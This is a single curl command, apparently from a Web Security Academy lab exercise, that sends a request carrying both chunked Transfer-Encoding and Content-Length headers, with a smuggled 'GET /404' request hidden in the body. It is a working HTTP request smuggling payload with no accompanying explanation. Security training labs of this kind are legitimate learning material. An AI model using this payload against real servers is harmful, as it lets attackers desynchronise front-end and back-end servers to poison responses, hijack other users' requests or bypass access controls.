curl -s --http1.1 -D - "https://<lab-url>.web-security-academy.net/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 35" \
  --data-binary $'0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X' -o /dev/null
